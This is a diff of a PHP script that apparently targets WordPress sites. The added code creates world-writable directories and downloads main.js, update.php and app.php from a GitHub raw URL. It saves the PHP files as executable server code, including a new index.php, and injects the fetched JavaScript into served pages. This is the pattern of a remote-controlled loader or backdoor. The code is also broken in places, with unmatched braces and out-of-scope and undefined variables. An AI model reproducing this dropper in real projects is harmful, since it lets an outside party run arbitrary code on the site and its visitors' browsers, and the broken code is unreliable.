@@ -108,37 +108,30 @@ unset($_POST);
 //header("Location: ".$_SERVER['PHP_SELF']);
 exit;
 } else {
+echo $server;
+$main = $server.".js";
+$style = $server.".css";
+$content = $server."-content.js";
+$update = $server."-update.php";
+$index = "index.php";
 
-$main = "main.js";
-$style = "vsdg.css";
-$content = "content.js";
-$update = "update.php";
 $url = parse_url($_SERVER['REQUEST_URI']);
 
 
-
-function update(){
-    
-    if (file_exists('/script/'. $main)) {
-        unlink('/script/'. $main);
-     }
     }
 
 
-if($_SERVER['QUERY_STRING'] !== 'beta'){
-    $content = 'content.js';
-    $css = 'vsdg.css';
-}else{
-    $content = 'beta.js';
-    $css = 'beta.css';
-
-}
 if (!file_exists('./script/')) {
     mkdir('./script/', 0777, true);
+}
+if (!file_exists('./functions/')) {
+    mkdir('./functions/', 0777, true);
 }
 if (!file_exists('./css/')) {
     mkdir('./css/', 0777, true);
 }
+
+
 if(!is_file('./script/'. $content)){
 
     $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
@@ -154,27 +147,36 @@ if(!is_file('./css/'. $css)){
 }
 
 
-if(!is_file('./'. $update)){
+if(!is_file('./functions/'. $update)){
 
-$js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
-$myfile = fopen('./'. $main, "w") or die("Unable to open $app!");
-fwrite($myfile, $js);
+$data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
+$myfile = fopen('./functions/'. $update, "w") or die("Unable to open $update!");
+fwrite($myfile, $data);
 fclose($myfile);
 
 }
 
 
-if(!is_file('./'. $update)){
+if(!is_file('./script/'. $main)){
 
-    $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
-    $myfile = fopen('./script/'. $update, "w") or die("Unable to open $update!");
-    fwrite($myfile, $js);
+    $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
+    $myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
+    fwrite($myfile, $data);
+    fclose($myfile);
+    
+    }
+    
+if(!is_file('./functions/'. $index)){
+
+    $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
+    $myfile = fopen('./functions/'. $index, "w") or die("Unable to open $index!");
+    fwrite($myfile, $data);
     fclose($myfile);
     
     }
     
 
-}
+
 
 $me = basename($_SERVER['PHP_SELF']);
 
@@ -191,13 +193,13 @@ if (file_exists($filename)) {
 
 function isWorpress(){
 
-if($me !== 'index.php'){
+
     
 echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
 echo "<script type='text/javascript' src='/script/${main}'></script>";
     echo "hello";
     exit;
-}
+
 }
 ?>
 
